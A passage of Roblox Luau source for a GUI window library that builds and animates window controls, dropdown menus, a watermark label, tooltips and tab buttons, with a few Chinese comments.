	Library:Tween(MainFrame , Library.TweenLibrary.WindowChanged,{Size = setup.Size})
	Library:Tween(Ico , Library.TweenLibrary.SmallEffect,{ImageTransparency = 1})
	
------ // 最小化设置    ----------------------------------------------------------------------------------------
	local WindowLibrary = {};
	local OpenDelay = tick();

	local Block = Instance.new("Frame")
	local Headers = Instance.new("Frame")
	local Title = Instance.new("TextLabel")
	local WindowControl = Instance.new("Frame")
	local UIListLayout = Instance.new("UIListLayout")
	local MinimizeButton = Instance.new("ImageButton")
	local UICorner = Instance.new("UICorner")
	local UIStroke = Instance.new("UIStroke")
	local MaxisizweButton = Instance.new("ImageButton")
	local UICorner_2 = Instance.new("UICorner")
	local UIStroke_2 = Instance.new("UIStroke")
	local CloseButton = Instance.new("ImageButton")
	local UICorner_3 = Instance.new("UICorner")
	local UIStroke_3 = Instance.new("UIStroke")
	local Frame = Instance.new("Frame")
	local DataFrame = Instance.new("Frame")
	local DataScrollingFrame = Instance.new("ScrollingFrame")
	local UIListLayout_2 = Instance.new("UIListLayout")
	local TabFrames = Instance.new("Frame")

	UIListLayout_2:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
		if not WindowLibrary.Toggle then
			return;
		end

		DataScrollingFrame.CanvasSize = UDim2.fromOffset(0,UIListLayout_2.AbsoluteContentSize.Y)
	end)

	Block.Name = "Block"
	Block.Parent = MainFrame
	Block.Active = true
	Block.AnchorPoint = Vector2.new(0.5, 0.5)
	Block.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Block.BackgroundTransparency = 1.000
	Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Block.BorderSizePixel = 0
	Block.Position = UDim2.new(0.5, 0, -2, 0)
	Block.Size = UDim2.new(1, 0, 1, 0)

	Library:Tween(Block , Library.TweenLibrary.WindowChanged,{Position = UDim2.new(0.5, 0, 0.5, 0)})

	Headers.Name = "Headers"
	Headers.Parent = Block
	Headers.Active = true
	Headers.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Headers.BackgroundTransparency = 1.000
	Headers.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Headers.BorderSizePixel = 0
	Headers.Size = UDim2.new(1, 0, 0, 25.8000000051)
	Headers.ZIndex = 4

	Title.Name = "Title"
	Title.Parent = Headers
	Title.AnchorPoint = Vector2.new(1, 0.5)
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.BorderColor3 = Color3.fromRGB(27, 42, 53)
	Title.BorderSizePixel = 0
	Title.Position = UDim2.new(0.4988150001, 0, 0.5, 0)
	Title.Size = UDim2.new(0.300001, 0, 0.600000024, 0)
	Title.ZIndex = 3
	Title.Font = Enum.Font.Gotham
	Title.Text = setup.Title
	Title.TextColor3 = Library.Colors.TextColor
	Title.TextScaled = true
	Title.TextSize = 14.000
	Title.TextStrokeColor3 = Library.Colors.TextColor
	Title.TextStrokeTransparency = 0.950
	Title.TextWrapped = true
	Title.TextXAlignment = Enum.TextXAlignment.Left
	Title.TextTransparency = 1
	Title.RichText = true

	task.delay(1,function()
		Library:Tween(Title , TweenInfo.new(1,Enum.EasingStyle.Quint),{
			TextStrokeTransparency = 0.950,
			TextTransparency = 0,
		})
	end)

	WindowControl.Name = "WindowControl"
	WindowControl.Parent = Headers
	WindowControl.AnchorPoint = Vector2.new(0, 0.5)
	WindowControl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	WindowControl.BackgroundTransparency = 1.000
	WindowControl.BorderColor3 = Color3.fromRGB(0, 0, 0)
	WindowControl.BorderSizePixel = 0
	WindowControl.Position = UDim2.new(0.01, 0, 0.5, 0)
	WindowControl.Size = UDim2.new(0.125, 0, 0.550000012, 0)
	
	UIListLayout.Parent = WindowControl
	UIListLayout.FillDirection = Enum.FillDirection.Horizontal
	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
	UIListLayout.Padding = UDim.new(0, 10)

	MinimizeButton.Name = "MinimizeButton"
	MinimizeButton.Parent = WindowControl
	MinimizeButton.BackgroundColor3 = Color3.fromRGB(80, 255, 71)
	MinimizeButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
	MinimizeButton.BorderSizePixel = 0
	MinimizeButton.Size = UDim2.new(0,0,0,0)
	MinimizeButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
	MinimizeButton.ZIndex = 10;
	MinimizeButton.HoverImage = "rbxassetid://9886659276";

	UICorner.CornerRadius = UDim.new(1, 0)
	UICorner.Parent = MinimizeButton

	UIStroke.Parent = MinimizeButton

	MaxisizweButton.Name = "MaxisizweButton"
	MaxisizweButton.Parent = WindowControl
	MaxisizweButton.BackgroundColor3 = Color3.fromRGB(255, 249, 85)
	MaxisizweButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
	MaxisizweButton.BorderSizePixel = 0
	MaxisizweButton.Size = UDim2.new(0,0,0,0)
	MaxisizweButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
	MaxisizweButton.HoverImage = 'rbxassetid://7733992901';
	MaxisizweButton.ZIndex = 10;

	UICorner_2.CornerRadius = UDim.new(1, 0)
	UICorner_2.Parent = MaxisizweButton

	UIStroke_2.Parent = MaxisizweButton

	CloseButton.Name = "CloseButton"
	CloseButton.Parent = WindowControl
	CloseButton.BackgroundColor3 = Color3.fromRGB(255, 88, 91)
	CloseButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
	CloseButton.BorderSizePixel = 0
	CloseButton.Size = UDim2.new(0,0,0,0)
	CloseButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
	CloseButton.ZIndex = 10;
	CloseButton.HoverImage = "rbxassetid://9886659671";


	task.delay(1,function()
		Library:Tween(MinimizeButton , TweenInfo.new(0.5,Enum.EasingStyle.Quint),{
			Size = UDim2.new(1, 0, 1, 0),
		})

		Library:Tween(MaxisizweButton , TweenInfo.new(1,Enum.EasingStyle.Quint),{
			Size = UDim2.new(1, 0, 1, 0),
		})

		Library:Tween(CloseButton , TweenInfo.new(1.5,Enum.EasingStyle.Quint),{
			Size = UDim2.new(1, 0, 1, 0),
		})
	end)

	UICorner_3.CornerRadius = UDim.new(1, 0)
	UICorner_3.Parent = CloseButton

	UIStroke_3.Parent = CloseButton

	Frame.Parent = Headers
	Frame.AnchorPoint = Vector2.new(0, 1)
	Frame.BackgroundColor3 = Color3.fromRGB(107, 110, 120)
	Frame.BackgroundTransparency = 0.250
	Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Frame.BorderSizePixel = 0
	Frame.Position = UDim2.new(0, 0, 1, 0)
	Frame.Size = UDim2.new(1, 0, 0, 1)

	DataFrame.Name = "DataFrame"
	DataFrame.Parent = Block
	DataFrame.AnchorPoint = Vector2.new(0, 1)
	DataFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	DataFrame.BackgroundTransparency = 1.000
	DataFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	DataFrame.BorderSizePixel = 0
	DataFrame.ClipsDescendants = true
	DataFrame.Position = UDim2.new(0, 5, 0.99, 0)
	DataFrame.Size = UDim2.new(0.302333206, 0, 0.920000017, 0)
	DataFrame.ZIndex = 2

	DataScrollingFrame.Name = "DataScrollingFrame"
	DataScrollingFrame.Parent = DataFrame
	DataScrollingFrame.Active = true
	DataScrollingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	DataScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	DataScrollingFrame.BackgroundTransparency = 1.000
	DataScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	DataScrollingFrame.BorderSizePixel = 0
	DataScrollingFrame.ClipsDescendants = false
	DataScrollingFrame.Position = UDim2.new(0.5, 0, 1.75, 0)
	DataScrollingFrame.Size = UDim2.new(0.99000001, 0, 0.980000019, 0)
	DataScrollingFrame.ScrollBarThickness = 0

	UIListLayout_2.Parent = DataScrollingFrame
	UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_2.Padding = UDim.new(0, 1000)

	local LogUpdate = function()
		if not WindowLibrary.Toggle then
			return;
		end

		local data = math.clamp((MainFrame.AbsoluteSize.X / 3.5) , 0, 235);

--[[	 Library:Tween(DataFrame,Library.TweenLibrary.UltrsFast,{
			Size = UDim2.new(0, data, 0, MainFrame.AbsoluteSize.Y - 33)
		})

		Library:Tween(TabFrames,Library.TweenLibrary.UltrsFast,{
			Size = UDim2.new(0, (MainFrame.AbsoluteSize.X - (data + 10)), 0, MainFrame.AbsoluteSize.Y - 47)
		})  
--]]

		DataFrame.Size = UDim2.new(0, data, 0, MainFrame.AbsoluteSize.Y - 33)
		TabFrames.Size = UDim2.new(0, (MainFrame.AbsoluteSize.X - (data + 10)), 0, MainFrame.AbsoluteSize.Y - 47)
	end

	spawn(function()
		local IsFullScreen = tick();

		while true do task.wait(0);
			if WindowLibrary.Toggle then
				if not WindowLibrary.FullScreen then
					local dist = math.abs(MainFrame.Size.Y.Offset - setup.Size.Y.Offset);

					if dist <= 25 and (tick() - OpenDelay) > 1 then
						LogUpdate();
					else
						if (tick() - OpenDelay) > 1 or (tick() - IsFullScreen) < 1 then
							LogUpdate();
							if (tick() - IsFullScreen) > 1 then
								task.wait(0.1)
							end;
						end;

					end;

				else
					IsFullScreen = tick();
					LogUpdate();
				end;
			end;
		end;
	end)

	Library:Tween(UIListLayout_2 , TweenInfo.new(1.5,Enum.EasingStyle.Quint),{
		Padding = UDim.new(0, 6)
	})

	Library:Tween(DataScrollingFrame , TweenInfo.new(2,Enum.EasingStyle.Quint),{
		Position = UDim2.new(0.5, 0, 0.5, 0)
	})

	TabFrames.Name = "TabFrames"
	TabFrames.Parent = Block
	TabFrames.AnchorPoint = Vector2.new(1, 1)
	TabFrames.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TabFrames.BackgroundTransparency = 1.000
	TabFrames.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TabFrames.BorderSizePixel = 0
	TabFrames.ClipsDescendants = true
	TabFrames.Position = UDim2.new(0.995, 0, 0.99, 0)
	TabFrames.Size = UDim2.new(0.670454323, 0, 0.88989073, 0)
	TabFrames.ZIndex = 4

	WindowLibrary.FullScreen = false;
	WindowLibrary.Status = 'Show';
	WindowLibrary.Toggle = true;
	WindowLibrary.SectionTab = {};

	local InitDropdown = function()
		local DropdownLibrary = {};

		local Dropdown = Instance.new("Frame")
		local UIStroke = Instance.new("UIStroke")
		local ScrollingFrame = Instance.new("ScrollingFrame")
		local UIListLayout = Instance.new("UIListLayout")
		local DropShadow = Instance.new("ImageLabel")

		Dropdown.Active = true;
		Dropdown.Name = "Dropdown"
		Dropdown.Parent = ScreenGui
		Dropdown.AnchorPoint = Vector2.new(0.5, 0.5)
		Dropdown.BackgroundColor3 = Library.Colors.Default
		Dropdown.BackgroundTransparency = 0.15
		Dropdown.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Dropdown.BorderSizePixel = 0
		Dropdown.ClipsDescendants = true
		Dropdown.Position = UDim2.new(0.707877576, 0, 0.563012242, 0)
		Dropdown.Size = UDim2.new(0,0,0,0)
		Dropdown.ZIndex = 100
		Dropdown.Visible = false;

		UIStroke.Transparency = 0.850
		UIStroke.Color = Color3.fromRGB(156, 156, 156)
		UIStroke.Parent = Dropdown

		ScrollingFrame.Parent = Dropdown
		ScrollingFrame.Active = true
		ScrollingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ScrollingFrame.BackgroundTransparency = 1.000
		ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ScrollingFrame.BorderSizePixel = 0
		ScrollingFrame.ClipsDescendants = false
		ScrollingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
		ScrollingFrame.Size = UDim2.new(0.980000019, 0, 0.980000019, 0)
		ScrollingFrame.ZIndex = 110
		ScrollingFrame.ScrollBarThickness = 0

		UIListLayout.Parent = ScrollingFrame
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIListLayout.Padding = UDim.new(0, 6)
		UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center;

		UIListLayout:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
			if WindowLibrary.Toggle then
				ScrollingFrame.CanvasSize = UDim2.fromOffset(0,UIListLayout.AbsoluteContentSize.Y)
			end
		end)

		DropShadow.Name = "DropShadow"
		DropShadow.Parent = Dropdown
		DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow.BackgroundTransparency = 1.000
		DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow.Position = UDim2.new(0, -5, 0, -5)
		DropShadow.Rotation = 0.010
		DropShadow.Size = UDim2.new(1, 10, 1, 10)
		DropShadow.ZIndex = 99
		DropShadow.Image = "rbxassetid://297694300"  --5
		DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow.ImageTransparency = 0.500
		DropShadow.ScaleType = Enum.ScaleType.Slice
		DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow.SliceScale = 0.050

		local NewButton = function(Title,HasIcon,IsDefault)
			local Frame = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local TextLabel = Instance.new("TextLabel")
			local Button = Instance.new("TextButton")
			local Icon = Instance.new("ImageLabel")

			Frame.Parent = ScrollingFrame
			Frame.BackgroundColor3 = Library.Colors.Default
			Frame.BackgroundTransparency = 0.250
			Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Frame.BorderSizePixel = 0
			Frame.Size = UDim2.new(0.980000019, 0, 0, 22)
			Frame.ZIndex = 115

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = Frame
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 114
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = Frame

			if IsDefault then
				UIStroke.Color = Library.Colors.Hightlight	
			end;

			TextLabel.Parent = Frame
			TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(0.980000019, 0, 0.550000012, 0)
			TextLabel.ZIndex = 116
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true

			if IsDefault then
				TextLabel.TextColor3 = Library.Colors.Hightlight
			end;

			Button.Name = "Button"
			Button.Parent = Frame
			Button.AnchorPoint = Vector2.new(0.5, 0.5)
			Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Button.BackgroundTransparency = 1.000
			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Button.BorderSizePixel = 0
			Button.Position = UDim2.new(0.5, 0, 0.5, 0)
			Button.Size = UDim2.new(1, 0, 1, 0)
			Button.ZIndex = 200
			Button.Font = Enum.Font.SourceSans
			Button.Text = ""
			Button.TextColor3 = Color3.fromRGB(0, 0, 0)
			Button.TextSize = 14.000
			Button.TextTransparency = 1.000

			Icon.Name = "Icon"
			Icon.Parent = Frame
			Icon.AnchorPoint = Vector2.new(0.5, 0.5)
			Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Icon.BackgroundTransparency = 1.000
			Icon.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Icon.BorderSizePixel = 0
			Icon.Position = UDim2.new(0.075000003, 0, 0.5, 0)
			Icon.Size = UDim2.new(0.699999988, 0, 0.699999988, 0)
			Icon.SizeConstraint = Enum.SizeConstraint.RelativeYY
			Icon.Visible = false
			Icon.ZIndex = 116
			Icon.Image = "rbxassetid://10709775704"

			if HasIcon then
				Icon.Visible = true
				Icon.Image = HasIcon;
			end;

			return Button
		end;

		function WindowLibrary:ClearDropdown()
			table.foreach(ScrollingFrame:GetChildren(),function(i,v)
				if v.ClassName == 'Frame' then
					v:Destroy();
				end;
			end)
		end;


		function WindowLibrary:SetDropdownValues(Type,Table,Default,Callback)
			if Type == 1 then -- Normal
				local OldButton = nil;

				for i,v in pairs(Table) do
					local Button;
					if typeof(v) ~= 'table' then
						Button = NewButton(tostring(v),false,v == Default);
					else
						Button = NewButton(tostring(v),v.Icon,v == Default);
					end;

					Button.MouseButton1Click:Connect(function()
						if OldButton then
							if OldButton.Object ~= v then
								OldButton.UIStroke.Color = Color3.fromRGB(156, 156, 156)	
								OldButton.TextLabel.TextColor3 = Library.Colors.TextColor
							end;
						end;

						OldButton = {
							UIStroke = Button.Parent:WaitForChild('UIStroke'),
							TextLabel = Button.Parent:WaitForChild('TextLabel'),
							Object = v;
						};

						Button.Parent:WaitForChild('UIStroke').Color = Library.Colors.Hightlight;
						Button.Parent:WaitForChild('TextLabel').TextColor3 = Library.Colors.Hightlight

						Callback(v);
					end)

					if v == Default then
						OldButton = {
							UIStroke = Button.Parent:WaitForChild('UIStroke'),
							TextLabel = Button.Parent:WaitForChild('TextLabel'),
							Object = v;
						};
					end
				end;
			else -- Multi
				local MaxMulti = Default.Max;
				local DefaultInfo = Default.Info;
				local MultiData = {};

				local Len = function()
					local std = 0;

					table['foreach'](MultiData,function()
						std += 1;
					end)

					return std;
				end;

				for i,v in pairs(Table) do
					local Button;

					if typeof(v) ~= 'table' then
						Button = NewButton(tostring(v),false,table.find(DefaultInfo,v));
					else
						Button = NewButton(tostring(v),v.Icon,table.find(DefaultInfo,v));
					end;

					local UIStroke = Button.Parent:WaitForChild('UIStroke');

					Button.MouseButton1Click:Connect(function()
						if MultiData[v] then
							UIStroke.Color = Color3.fromRGB(156, 156, 156)
							Button.Parent:WaitForChild('TextLabel').TextColor3 = Library.Colors.TextColor

							MultiData[v] = nil;
						else
							if (Len() + 1) > MaxMulti then
								return;
							end;

							MultiData[v] = {
								Object = v,
								UIStroke = UIStroke,
							};

							Button.Parent:WaitForChild('TextLabel').TextColor3 = Library.Colors.Hightlight
							UIStroke.Color = Library.Colors.Hightlight;
						end;

						local info = {};

						table.foreach(MultiData,function(a)
							table.insert(info,a)
						end)

						Callback(info);
					end)

					if table.find(DefaultInfo,v) then

						MultiData[v] = {
							Object = v,
							UIStroke = UIStroke,
						}

					end
				end;
			end;
		end;
		do
-----// 水印 ---------------------------------------------------------------------------------------------------------------------------------------------
			local Watermark = Instance.new("Frame")
			local UIListLayout = Instance.new("UIListLayout")

			Watermark.Name = "Watermark"
			Watermark.Parent = ScreenGui;
			Watermark.AnchorPoint = Vector2.new(1, 0)
			Watermark.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Watermark.BackgroundTransparency = 1.000
			Watermark.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Watermark.BorderSizePixel = 0
			Watermark.Position = UDim2.new(1, -5, 0, 35)
			Watermark.Size = UDim2.new(0.200000003, 0, 0, 10)

			UIListLayout.Parent = Watermark
			UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
			UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			UIListLayout.Padding = UDim.new(0, 1)

			function WindowLibrary:Watermark(text)
				local Frame = Instance.new("Frame")
				local UIStroke = Instance.new("UIStroke")
				local TextLabel = Instance.new("TextLabel")

				Frame.Parent = Watermark
				Frame.BackgroundColor3 = Library.Colors.Default
				Frame.BackgroundTransparency = 0.250
				Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Frame.BorderSizePixel = 0
				Frame.Size = UDim2.new(0,0,0,0)
				Frame.ZIndex = 255;

				UIStroke.Transparency = 0.850
				UIStroke.Color = Color3.fromRGB(156, 156, 156)
				UIStroke.Parent = Frame

				TextLabel.Parent = Frame
				TextLabel.AnchorPoint = Vector2.new(1, 0.5)
				TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel.BackgroundTransparency = 1.000
				TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel.BorderSizePixel = 0
				TextLabel.Position = UDim2.new(1, -5, 0.5, 0)
				TextLabel.Size = UDim2.new(0.9, 0, 0.9, 0)
				TextLabel.Font = Enum.Font.Gotham
				TextLabel.TextColor3 = Library.Colors.TextColor
				TextLabel.TextSize = 13.000
				TextLabel.TextStrokeTransparency = 0.950
				TextLabel.TextXAlignment = Enum.TextXAlignment.Right
				TextLabel.TextYAlignment = Enum.TextYAlignment.Top
				TextLabel.Text = text or "";
				TextLabel.ZIndex = 256;
				TextLabel.RichText = true;

				local update = function()
					local size = Library:GetTextSize(TextLabel.Text:gsub("<.->", ""),13,TextLabel.Font);

					Library:Tween(Frame , Library.TweenLibrary.FastEffect , {
						Size = UDim2.new(0, size.X + 10, 0, size.Y + 5);
					})
				end;

				local Index = {};

				function Index:Visible(v)
					Frame.Visible = v;
				end

				function Index:Update()
					update()
				end;

				function Index:Text(a)
					TextLabel.Text = a;
					update()
				end;

				function Index:Destroy()
					Frame:Destroy();
				end;

				update();

				return Index;
			end;
		end;

		DropdownLibrary.OnDropdown = false;
		DropdownLibrary.Hover = false;

		local CloseTick = tick();

		function WindowLibrary:OpenDropdown(BaseFrame :Frame)
			DropdownLibrary.OnDropdown = true;

			Dropdown.Visible = true;
			DropdownLibrary.BaseFrame = BaseFrame;

			Library:Tween(Dropdown,Library.TweenLibrary.SmallEffect,{
				Size = UDim2.new(0, 173, 0, 213),
				Position = UDim2.fromOffset(BaseFrame.AbsolutePosition.X,BaseFrame.AbsolutePosition.Y)
			})
		end;

		function WindowLibrary:CloseDropdown(BaseFrame :Frame)
			DropdownLibrary.OnDropdown = false;

			Library:Tween(Dropdown,Library.TweenLibrary.SmallEffect,{
				Size = UDim2.new(0,90,0,0),
			})

			if DropdownLibrary.BaseFrame then
				Library:Tween(Dropdown,Library.TweenLibrary.SmallEffect,{
					Position = UDim2.new(0,DropdownLibrary.BaseFrame.AbsolutePosition.X + (DropdownLibrary.BaseFrame.AbsoluteSize.X / 2),0,DropdownLibrary.BaseFrame.AbsolutePosition.Y),
				})
			end
		end;

		Dropdown.MouseEnter:Connect(function()
			DropdownLibrary.Hover = true;
		end)

		Dropdown.MouseLeave:Connect(function()
			DropdownLibrary.Hover = false;
		end)

		Library.UserInputService.InputBegan:Connect(function(std)
			if std.UserInputType == Enum.UserInputType.MouseButton1 or std.UserInputType == Enum.UserInputType.MouseButton2 or std.UserInputType == Enum.UserInputType.Touch then
				if not DropdownLibrary.Hover then
					WindowLibrary:CloseDropdown();
					CloseTick = tick();
				end
			end;
		end)

		game:GetService('RunService').RenderStepped:Connect(function()

			if DropdownLibrary.OnDropdown and DropdownLibrary.BaseFrame then
				Library:Tween(Dropdown,Library.TweenLibrary.SmallEffect,{
					Size = UDim2.new(0, 173, 0, math.clamp(UIListLayout.AbsoluteContentSize.Y + 15,27,213)),
					Position = UDim2.fromOffset(DropdownLibrary.BaseFrame.AbsolutePosition.X + (DropdownLibrary.BaseFrame.AbsoluteSize.X / 2),DropdownLibrary.BaseFrame.AbsolutePosition.Y - 25)
				})
			else
				if (tick() - CloseTick) > 0.35 then
					Dropdown.Visible = false;
				end;
			end
		end)
	end;

	InitDropdown();

	do
		local Tip = Instance.new("TextLabel")

		Tip.Name = "Tip"
		Tip.Parent = ScreenGui;
		Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Tip.BackgroundTransparency = 1.000
		Tip.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Tip.BorderSizePixel = 0
		Tip.Size = UDim2.new(0, 250, 0, 16)
		Tip.Visible = false
		Tip.Font = Enum.Font.Gotham
		Tip.Text = ""
		Tip.TextColor3 = Library.Colors.TextColor;
		Tip.TextSize = 14.000
		Tip.TextStrokeTransparency = 0.950
		Tip.TextXAlignment = Enum.TextXAlignment.Left
		Tip.TextYAlignment = Enum.TextYAlignment.Top
		Tip.Visible = false;

		function WindowLibrary:AddToolTip(object : GuiObject, text : string)
			object.MouseEnter:Connect(function()
				Tip.Visible = true;
				Tip.ZIndex = 155;
				Tip.Text = text;
			end);

			object.MouseLeave:Connect(function()
				Tip.Visible = false;
			end);
		end;

		game:GetService('RunService'):BindToRenderStep("_TOOL_TIP_",120,function()
			if Tip.Visible then
				Library:Tween(Tip,Library.TweenLibrary.FastEffect,{
					TextTransparency = 0.55,
					TextStrokeTransparency = 0.950
				})

				local siz = Library:GetTextSize(Tip.Text,14,Tip.Font);
				local pos = Library.UserInputService:GetMouseLocation();

				Tip.Size = UDim2.fromOffset(siz.X + 1,siz.Y + 2);
				Tip.Position = UDim2.fromOffset(pos.X + (siz.X / 5),pos.Y - 58)
			else
				Library:Tween(Tip,Library.TweenLibrary.FastEffect,{
					TextTransparency = 1,
					TextStrokeTransparency = 1
				})
			end;
		end)
	end;
	
	function WindowLibrary:XG(TabSetup)
		TabSetup = TabSetup or {};
		TabSetup.Title = TabSetup.Title or "菜单";
		TabSetup.Icon = TabSetup.Icon or 'XGO1';
		TabSetup.Description = TabSetup.Description or "";

		local TFrame = Instance.new("Frame")
		local DropShadow = Instance.new("ImageLabel")
		local UIStroke = Instance.new("UIStroke")
		local Icon = Instance.new("ImageLabel")
		local Title = Instance.new("TextLabel")
		local Description = Instance.new("TextLabel")
		local Arrow = Instance.new("ImageLabel")
		local Button = Instance.new("TextButton")
        
		TFrame.Name = "TFrame"
		TFrame.Parent = DataScrollingFrame
		TFrame.BackgroundColor3 = Library.Colors.Default
		TFrame.BackgroundTransparency = 0.250
		TFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TFrame.BorderSizePixel = 0
		TFrame.Size = UDim2.new(0.99, 0, 0, Library.TabButtonHeight)
		TFrame.ZIndex = 5

		DropShadow.Name = "DropShadow"
		DropShadow.Parent = TFrame
		DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		DropShadow.BackgroundTransparency = 1.000
		DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
		DropShadow.Position = UDim2.new(0, -5, 0, -5)
		DropShadow.Size = UDim2.new(1, 10, 1, 10)
		DropShadow.ZIndex = 4
		DropShadow.Image = "rbxassetid://297694300"
		DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
		DropShadow.ImageTransparency = 0.500
		DropShadow.ScaleType = Enum.ScaleType.Slice
		DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
		DropShadow.SliceScale = 0.050

        UIStroke.Transparency = 1
        UIStroke.Color = Color3.fromRGB(156, 156, 156)
        UIStroke.Parent = TFrame

		Icon.Name = "Icon"
		Icon.Parent = TFrame
		Icon.AnchorPoint = Vector2.new(0, 0.5)
		Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Icon.BackgroundTransparency = 1.000
		Icon.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Icon.BorderSizePixel = 0
		Icon.Position = UDim2.new(0, 5, 0.5, 0)
		Icon.Size = UDim2.new(0.649999976, 0, 0.649999976, 0)
		Icon.SizeConstraint = Enum.SizeConstraint.RelativeYY
		Icon.ZIndex = 5
		Icon.Image = Library.Icons[TabSetup.Icon] or Library.Icons2["lucide-"..TabSetup.Icon] or TabSetup.Icon;
		Icon.ImageTransparency = 0.150

		Title.Name = "Title"
		Title.Parent = TFrame
		Title.AnchorPoint = Vector2.new(0, 0.5)
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Title.BorderSizePixel = 0
		Title.Position = UDim2.new(0.665000021, 0, 0.5, 0)
		Title.Size = UDim2.new(0.899999976, 0, 0.400000006, 0)
		Title.ZIndex = 6
		Title.Font = Enum.Font.Gotham
		Title.Text = TabSetup.Title
		Title.TextColor3 = Library.Colors.TextColor
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextStrokeColor3 = Library.Colors.TextColor
		Title.TextStrokeTransparency = 0.950
		Title.TextWrapped = true
		Title.TextXAlignment = Enum.TextXAlignment.Left
		Title.RichText = true;	
								
		Description.Name = "Description"
        Description.Parent = TFrame
        Description.AnchorPoint = Vector2.new(0, 0.5)
        Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Description.BackgroundTransparency = 1.000
		Description.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Description.BorderSizePixel = 0
		Description.Position = UDim2.new(0.42, 0, 0.5, 0)
		Description.Size = UDim2.new(0.25, 0, 1, 0)
		Description.Font = Enum.Font.Fondamento
		Description.Text = TabSetup.Description
